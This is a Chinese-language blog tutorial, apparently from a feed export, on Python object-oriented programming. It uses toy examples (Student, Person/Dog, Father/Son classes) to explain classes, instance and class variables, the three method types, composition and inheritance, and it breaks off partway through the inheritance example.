    <content type="html"><![CDATA[<p><a name="659b5af5"></a></p><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p><a name="31a3ef15"></a></p><h4 id="面向过程VS面向对象"><a href="#面向过程VS面向对象" class="headerlink" title="面向过程VS面向对象"></a>面向过程VS面向对象</h4><ul><li>面向过程的程序设计的核心是过程（流水线式思维），过程即解决问题的步骤，面向过程的思想就好比是精心设计好一条流水线，考虑周全什么时候处理什么东西。 </li><li><strong>优点是：极大的降低了写程序的复杂度，只需要顺着要执行的步骤，堆叠代码即可。</strong> </li><li><strong>缺点是：一套流水线就是用来解决一个问题，代码牵一发而动全身。</strong> </li><li>应用场景： <ul><li>一旦完成基本很少改变的场景，著名的例子有Linux內核，git，以及Apache HTTP Server等。</li></ul></li><li>面向对象OOP，是一种程序设计思想。OOP把对象作为程序的基本单元，并且一个对象包含数据和操作数据的方法。 </li><li>面向对象的程序设计的核心是对象，要理解对象为何物，必须把自己当成上帝（上帝式思维）。上帝眼里世间存在的万物皆为对象。 </li><li>形象化场景设计： <ul><li>面向对象的程序设计好比如来设计西游记，如来要解决的问题是把经书传给东土大唐，”如来”想了想解决这个问题需要四个人（对象）：唐僧，沙和尚，猪八戒，孙悟空，每个人都有各自的特征和技能（这就是对象的概念，特征和技能分别对应对象的属性和方法）。然而这并不好玩，于是如来又安排了一群妖魔鬼怪，为了防止师徒四人在取经路上被搞死，又安排了一群神仙保驾护航，这些都是对象。然后取经开始，师徒四人与妖魔鬼怪神仙互相缠斗着直到最后取得真经。“如来”根本不会管师徒四人按照什么流程去取，只关心最后结果是否可以实现。</li><li>因此面向对象的核心思想就是使用一个有一个的对象来完成某件具体是事件，且不用关心完成的具体过程！</li></ul></li><li><strong>面向对象的优点：面向对象编程可以使程序的维护和扩展变得更简单，并且可以大大提高程序开发效率 ，另外，基于面向对象的程序可以使他人更加容易理解你的代码逻辑，从而使团队开发变得更从容。</strong> </li><li><strong>应用场景：需求经常变化的软件，如互联网应用，企业内部软件，游戏等都是面向对象的程序设计大显身手的好地方。</strong></li></ul><p><a name="a8171c68"></a></p><h4 id="类和实例"><a href="#类和实例" class="headerlink" title="类和实例"></a>类和实例</h4><p><strong>类</strong>，英文名字Class，有“类别”，“分类”，“聚类”的意思。</p><p>必须牢记类是抽象的模板，用来描述具有相同属性和方法的对象的集合，比如Animal类。</p><p>而<strong>实例</strong>是根据类创建出来的一个个具体的“对象”，每个对象都拥有相同的方法，但各自的数据可能不同。</p><ul><li>Python使用class关键字来定义类，其基本结构如下： </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">类名</span>(): <span class="hljs-comment">#一般类名首字母是大写</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>下面是一个学生类： </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>  <span class="hljs-comment">#数据</span><br>    classroom = <span class="hljs-string">&#x27;101&#x27;</span><br>    address = <span class="hljs-string">&#x27;beijing&#x27;</span> <br><span class="hljs-comment">#构造方法:用来初始化实例变量的</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><span class="hljs-comment">#操作</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_age</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s: %s&#x27;</span> % (<span class="hljs-variable language_">self</span>.name, <span class="hljs-variable language_">self</span>.age))<br></code></pre></td></tr></table></figure><ul><li><h2 id="对象的创建-可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例（对象）。-Python提供了一个def-init-self-的实例化机制。任何一个类中，名字为-init-的方法就是类的实例化方法，具有-init-方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。"><a href="#对象的创建-可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例（对象）。-Python提供了一个def-init-self-的实例化机制。任何一个类中，名字为-init-的方法就是类的实例化方法，具有-init-方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。" class="headerlink" title="对象的创建 -  可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例（对象）。 -  Python提供了一个def __init__(self):的实例化机制。任何一个类中，名字为__init__的方法就是类的实例化方法，具有__init__方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。 "></a>对象的创建<br> -  可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例（对象）。<br> -  Python提供了一个<code>def __init__(self):</code>的实例化机制。任何一个类中，名字为<code>__init__</code>的方法就是类的实例化方法，具有<code>__init__</code>方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。 </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">zhangsan = Student(<span class="hljs-string">&#x27;zhangsan&#x27;</span>,<span class="hljs-number">20</span>)<br>lisi = Student(<span class="hljs-string">&#x27;lisi&#x27;</span>,<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><a name="d8375256"></a></p><h4 id="实例变量和类变量"><a href="#实例变量和类变量" class="headerlink" title="实例变量和类变量"></a>实例变量和类变量</h4><ul><li>实例变量 <ul><li>实例变量指的是实例（对象）本身拥有的变量。Student类中<code>__init__</code>方法里的name和age就是两个实例变量。 </li><li>通过实例名加圆点的方式调用实例变量（可以通过对象名打点的方式去调用&#x2F;访问属于对象的成员）。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    <span class="hljs-comment">#init称为构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,i_name,i_age</span>):<br>        <span class="hljs-comment">#只要定义在init方法内部的变量就是【实例/对象变量】</span><br>        <span class="hljs-variable language_">self</span>.name = i_name <span class="hljs-comment">#self.name就是定义的实例变量，name是init方法的参数值</span><br>        <span class="hljs-variable language_">self</span>.age = i_age <span class="hljs-comment">#self.age就是定义的实例变量，age就是init方法的参数值</span><br><br>s1 = Student(<span class="hljs-string">&#x27;zhangsan&#x27;</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#调用Student类中的init这个构造方法</span><br>s2 = Student(<span class="hljs-string">&#x27;lisi&#x27;</span>,<span class="hljs-number">25</span>)<br><span class="hljs-comment">#根据对象的引用访问对象的实例变量</span><br><span class="hljs-built_in">print</span>(s1.name,s1.age) <span class="hljs-comment">#访问s1对象的name和age这两个实例变量</span><br><span class="hljs-built_in">print</span>(s2.name,s2.age) <span class="hljs-comment">#访问s2对象的name和age这两个实例变量</span><br></code></pre></td></tr></table></figure><ul><li>类变量 <ul><li>定义在类中，方法之外的变量，称作类变量。类变量是所有实例公有的变量，每一个实例都可以访问类变量。 </li><li>在Student类中，classroom和address两个变量就是类变量。可以通过类名或者实例名加圆点的方式访问类变量，比如：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    <span class="hljs-comment">#定义在方法外部的变量：类变量</span><br>    address = <span class="hljs-string">&#x27;Beijing&#x27;</span><br>    classroom = <span class="hljs-number">167</span><br>    <br>    <span class="hljs-comment">#init称为构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,i_name,i_age</span>):<br>        <span class="hljs-comment">#只要定义在init方法内部的变量就是【实例/对象变量】</span><br>        <span class="hljs-variable language_">self</span>.name = i_name <span class="hljs-comment">#self.name就是定义的实例变量，name是init方法的参数值</span><br>        <span class="hljs-variable language_">self</span>.age = i_age <span class="hljs-comment">#self.age就是定义的实例变量，age就是init方法的参数值</span><br><br>s1 = Student(<span class="hljs-string">&#x27;zhangsan&#x27;</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#调用Student类中的init这个构造方法</span><br>s2 = Student(<span class="hljs-string">&#x27;lisi&#x27;</span>,<span class="hljs-number">25</span>)<br><span class="hljs-comment">#根据对象的引用访问对象的实例变量</span><br><span class="hljs-built_in">print</span>(s1.name,s1.age) <span class="hljs-comment">#访问s1对象的name和age这两个实例变量</span><br><span class="hljs-built_in">print</span>(s2.name,s2.age) <span class="hljs-comment">#访问s2对象的name和age这两个实例变量</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  类变量的特性：      -  所有的类变量是可以通过类名或者对象名打点的方式访问/调用的。      -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(s1.address,s1.classroom) <span class="hljs-comment">#通过对象名可以访问类变量（不推荐）</span><br><span class="hljs-comment">#通过类名可以访问类变量（推荐）</span><br><span class="hljs-built_in">print</span>(Student.address,Student.classroom)<br></code></pre></td></tr></table></figure><pre><code class="hljs">     -  类变量是可以被所有的对象公用的      -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(s1.address,s1.classroom) <span class="hljs-comment">#通过s1对象访问类变量</span><br><span class="hljs-built_in">print</span>(s2.address,s2.classroom) <span class="hljs-comment">#通过s2对象访问类变量</span><br></code></pre></td></tr></table></figure><p><a name="7593d598"></a></p><h4 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h4><p>Python的类中包含实例方法、静态方法和类方法三种方法。区别在于传入的参数和调用方式不同。</p><p>在类的内部，使用<code>def</code>关键字来定义一个方法。</p><p><a name="273a5d98"></a></p><h5 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h5><ul><li><h2 id="类的实例方法由实例调用，至少包含一个self参数，且为第一个参数。执行实例方法时，会自动将调用该方法的实例赋值给self。-self代表的是类的实例，而非类本身。self不是关键字，而是Python约定成俗的命名，你完全可以取别的名字，但不建议这么做。-例如，我们前面Student类中的print-age-就是实例方法："><a href="#类的实例方法由实例调用，至少包含一个self参数，且为第一个参数。执行实例方法时，会自动将调用该方法的实例赋值给self。-self代表的是类的实例，而非类本身。self不是关键字，而是Python约定成俗的命名，你完全可以取别的名字，但不建议这么做。-例如，我们前面Student类中的print-age-就是实例方法：" class="headerlink" title="类的实例方法由实例调用，至少包含一个self参数，且为第一个参数。执行实例方法时，会自动将调用该方法的实例赋值给self。 -  self代表的是类的实例，而非类本身。self不是关键字，而是Python约定成俗的命名，你完全可以取别的名字，但不建议这么做。 -  例如，我们前面Student类中的print_age()就是实例方法： "></a>类的实例方法由实例调用，至少包含一个self参数，且为第一个参数。执行实例方法时，会自动将调用该方法的实例赋值给self。<br> -  <code>self</code>代表的是类的实例，而非类本身。<code>self</code>不是关键字，而是Python约定成俗的命名，你完全可以取别的名字，但不建议这么做。<br> -  例如，我们前面Student类中的print_age()就是实例方法： </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    classroot = <span class="hljs-number">167</span> <span class="hljs-comment">#类变量</span><br>    <span class="hljs-comment">#构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        <span class="hljs-comment">#实例变量</span><br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>    <span class="hljs-comment">#实例方法:self不是python的关键字，实例方法的第一个参数也可以叫其他的名字，但是约定俗成叫做self。</span><br>    <span class="hljs-comment">#注意：实例方法只可以通过对象调用。</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">study</span>(<span class="hljs-params">self,book</span>):<span class="hljs-comment">#self是不需要手动给其传值</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在学习的书籍是：&#x27;</span>,book)<br><br>s = Student(<span class="hljs-string">&#x27;zhangsan&#x27;</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#调用构造方法</span><br><span class="hljs-comment">#只给除了self其他的参数传值</span><br>s.study(<span class="hljs-string">&#x27;高等数学&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>实例方法中的第一个参数self到底是什么鬼？ <ul><li>想要在一个实例方法内部调用另一个实例方法？ <ul><li>核心：实例方法只可以被对象调用</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    classroot = <span class="hljs-number">167</span> <span class="hljs-comment">#类变量</span><br>    <span class="hljs-comment">#构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        <span class="hljs-comment">#实例变量</span><br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br>    <span class="hljs-comment">#实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">study</span>(<span class="hljs-params">self,book</span>): <span class="hljs-comment">#self就是study方法的调用者（对象）</span><br>        <span class="hljs-comment">#注意：在study方法内部调用play方法，如何实现？</span><br>        <span class="hljs-variable language_">self</span>.play(<span class="hljs-string">&#x27;足球&#x27;</span>) <span class="hljs-comment">#实例方法必须使用对象调用</span><br>        <span class="hljs-comment">#self表示的就是调用该方法的对象的引用</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在学习的书籍是：&#x27;</span>,book)<br>    <span class="hljs-comment">#实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">play</span>(<span class="hljs-params">self,b</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在玩的项目是:&#x27;</span>,b)<br><br>s = Student(<span class="hljs-string">&#x27;zhangsan&#x27;</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#调用构造方法</span><br>s.study(<span class="hljs-string">&#x27;高等数学&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">  - self就是study方法的调用者（对象），self表示的就是调用该方法的对象的引用</code></pre><p><strong>对象之间的交互</strong>：设计人狗大战游戏，让他们真正的打一架。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.blood = <span class="hljs-number">100</span> <span class="hljs-comment">#人的初始血量</span><br>        <span class="hljs-variable language_">self</span>.gjl = <span class="hljs-number">10</span> <span class="hljs-comment">#人的攻击力</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hitDog</span>(<span class="hljs-params">self,dog</span>): <span class="hljs-comment">#dog参数表示的是狗对象</span><br>        <span class="hljs-comment">#人打狗后，需要让狗的血量减去人的攻击力</span><br>        dog.blood -= <span class="hljs-variable language_">self</span>.gjl<br>    <span class="hljs-comment">#展示剩余血量</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">showBlood</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s，剩下的血量为：%d&#x27;</span>%(<span class="hljs-variable language_">self</span>.name,<span class="hljs-variable language_">self</span>.blood))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.blood = <span class="hljs-number">50</span> <span class="hljs-comment">#狗的初始血量</span><br>        <span class="hljs-variable language_">self</span>.gjl = <span class="hljs-number">5</span> <span class="hljs-comment">#狗的攻击力</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hitPerson</span>(<span class="hljs-params">self,p</span>): <span class="hljs-comment">#参数p就是狗攻击的人那个对象</span><br>        p.blood -= <span class="hljs-variable language_">self</span>.gjl<br>    <span class="hljs-comment">#展示剩余血量</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">showBlood</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s，剩下的血量为：%d&#x27;</span>%(<span class="hljs-variable language_">self</span>.name,<span class="hljs-variable language_">self</span>.blood))<br><br>p1 = Person(<span class="hljs-string">&#x27;zhangsan&#x27;</span>)<br>p2 = Person(<span class="hljs-string">&#x27;lisi&#x27;</span>)<br><br>d1 = Dog(<span class="hljs-string">&#x27;doudou&#x27;</span>)<br>d2 = Dog(<span class="hljs-string">&#x27;huanghuang&#x27;</span>)<br><br>p2.hitDog(d1) <span class="hljs-comment">#lisi去攻击doudou这条狗</span><br>d1.showBlood() <span class="hljs-comment">#查看被攻击后的狗还剩下多少血量</span><br><br>d2.hitPerson(p1) <span class="hljs-comment">#huanghuang去攻击zhangsan</span><br>p1.showBlood() <span class="hljs-comment">#查看被攻击后的人还剩下多少血量</span><br></code></pre></td></tr></table></figure><p><a name="85b97dce"></a></p><h5 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h5><ul><li>静态方法由类调用，无默认参数。将实例方法参数中的self去掉，然后在方法定义上方加上@staticmethod，就成为静态方法。 </li><li>静态方法属于类，和实例无关。建议只使用类名.静态方法的调用方式。（虽然也可以使用实例名.静态方法的方式调用） </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Obj</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>      <br>    <span class="hljs-comment">#定义一个静态方法</span><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">staticFunc</span>(<span class="hljs-params">name</span>):<span class="hljs-comment">#静态方法不需要有任何的必要参数</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是静态方法！，我有一个普通参数：&#x27;</span>,name)<br><br>Obj.staticFunc(<span class="hljs-string">&#x27;bobo&#x27;</span>) <span class="hljs-comment">#通过类名调用（推荐）</span><br>o = Obj()<br>o.staticFunc(<span class="hljs-string">&#x27;bobo&#x27;</span>) <span class="hljs-comment">#通过对象名调用（不推荐）</span><br><span class="hljs-comment">#静态方法既不属于类也不属于对象，仅仅是写在类内部的一个普通函数而已</span><br></code></pre></td></tr></table></figure><p><a name="980a0760"></a></p><h5 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h5><ul><li>类方法由类调用，采用@classmethod装饰，至少传入一个cls（代指类本身，类似self）参数。 </li><li>执行类方法时，自动将调用该方法的类赋值给cls。建议只使用类名.类方法的调用方式。（虽然也可以使用实例名.类方法的方式调用）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Obj</span>():<br>    f = <span class="hljs-string">&#x27;classVar&#x27;</span> <span class="hljs-comment">#类变量</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">classFunc</span>(<span class="hljs-params">cls</span>): <span class="hljs-comment">#类方法必须要有一个cls的参数，且作为第一个参数</span><br>        <span class="hljs-comment">#cls也不是python的关键字，cls也可以写作其他的形式，比如：name，self</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是类方法！必要参数cls的值为：&#x27;</span>,cls)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;类变量的值为:&#x27;</span>,cls.f) <span class="hljs-comment">#类名访问类变量</span><br>        <span class="hljs-comment">#cls表示的是当前类</span><br><br>o = Obj()<br>o.classFunc() <span class="hljs-comment">#通过对象名访问（不推荐）</span><br><br>Obj.classFunc() <span class="hljs-comment">#通过类名访问（推荐）</span><br></code></pre></td></tr></table></figure><ul><li>在类方法中是否可以调用实例方法和实例变量？ <ul><li>不能，因为实例变量和实例方法只可以通过对象名访问，但是在类方法内部不存在对象名。</li></ul></li><li>在实例方法中是否可以调用类方法和类变量？ <ul><li>可以，但是不建议这么做！</li></ul></li></ul><p><a name="bf3b2895"></a></p><h4 id="面向对象的组合用法"><a href="#面向对象的组合用法" class="headerlink" title="面向对象的组合用法"></a>面向对象的组合用法</h4><ul><li><strong>组合指的是，在一个类中以另外一个类的对象作为数据属性，称为类的组合</strong> </li><li>思路设计：一个学生会有一步手机，学生使用手机看电影。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#将创建好的手机对象赋值给了phone这个实例变量</span><br>        <span class="hljs-variable language_">self</span>.phone = Phone(<span class="hljs-string">&#x27;霸王别姬&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,movie_name</span>):<br>        <span class="hljs-variable language_">self</span>.movie_name = movie_name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">playMovie</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;手机正在播放的电影是：&#x27;</span>,<span class="hljs-variable language_">self</span>.movie_name)<br><br>s1 = Student()<br>s1.phone.playMovie()<br></code></pre></td></tr></table></figure><p><a name="2dde3029"></a></p><h5 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h5><ul><li>继承来源于现实世界： <ul><li>一个最简单的例子就是孩子会具有父母的一些特征，即每个孩子都会继承父亲或者母亲的某些特征，当然这只是最基本的继承关系，现实世界中还存在着更复杂的继承。</li></ul></li><li>在OOP程序设计中，当我们定义一个新类的时候，新的类称为子类（Subclass），而被继承的类称为基类、父类或超类（Base class、Super class）。 <ul><li>继承最大的好处是子类获得了父类的全部变量和方法的同时，又可以根据需要进行修改、拓展。其语法结构如下：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>(superA, superB,superC....):<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>Python支持多父类的继承机制。</li></ul><p>继承示例代码：子类可以继承到父类中所有的成员</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>():<br>    address = <span class="hljs-string">&#x27;Beijing&#x27;</span> <span class="hljs-comment">#类变量</span><br>    <span class="hljs-comment">#构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,fistName,hobby</span>):<br>        <span class="hljs-comment">#两个实例变量</span><br>        <span class="hljs-variable language_">self</span>.firstName = fistName<br>        <span class="hljs-variable language_">self</span>.hobby = hobby<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_xxx</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father的实例方法&#x27;</span>)<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">classFunc</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father类的类方法&#x27;</span>)<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">staticFunc</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father类的静态方法&#x27;</span>)<br><span class="hljs-comment">#Son继承了Father这个类</span><br><span class="hljs-comment">#Son子类，Father父类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(<span class="hljs-title class_ inherited__">Father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment">#1.子类可以继承到父类的构造方法</span><br>s = Son(<span class="hljs-string">&#x27;zhang&#x27;</span>,<span class="hljs-string">&#x27;smoke&#x27;</span>) <span class="hljs-comment">#调用子类的构造方法，子类是可以继承到父类的构造方法</span><br><span class="hljs-comment">#2.子类可以继承到父类的类变量</span><br><span class="hljs-built_in">print</span>(Son.address)<br><span class="hljs-comment">#3.子类可以继承到父类的实例变量</span><br><span 